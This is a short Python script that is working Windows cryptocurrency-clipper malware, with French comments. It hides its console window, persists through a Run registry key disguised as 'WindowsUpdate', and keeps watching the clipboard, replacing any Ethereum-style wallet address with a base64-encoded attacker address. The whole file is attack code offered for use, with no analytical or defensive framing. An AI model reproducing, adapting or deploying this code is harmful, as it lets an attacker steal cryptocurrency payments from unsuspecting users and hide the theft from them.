import pyperclip as cp
import re
import time
import ctypes
import winreg
import sys
import base64

# Ton adresse encodée en base64 (remplace par la tienne)
A1 = base64.b64decode("MHhiOGI5Q2M4QmI1MmJhRTU4Q2VCQjdjYTc4NDVlRGM2NDIzYjY0ODRk").decode()

REG = r'^0x[a-fA-F0-9]{40}$'

def cacher():
    try:
        k = ctypes.WinDLL('kernel32')
        u = ctypes.WinDLL('user32')
        k.GetConsoleWindow.restype = ctypes.c_void_p
        h = k.GetConsoleWindow()
        if h:
            u.ShowWindow(h, 0)
    except:
        pass

def persist():
    try:
        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(k)
    except:
        pass

def run():
    cacher()
    persist()
    last = ""
    while True:
        curr = cp.paste()
        if curr != last:
            if re.match(REG, curr):
                cp.copy(A1)
                last = A1
            else:
                last = curr
        time.sleep(0.5)

if __name__ == "__main__":
    run()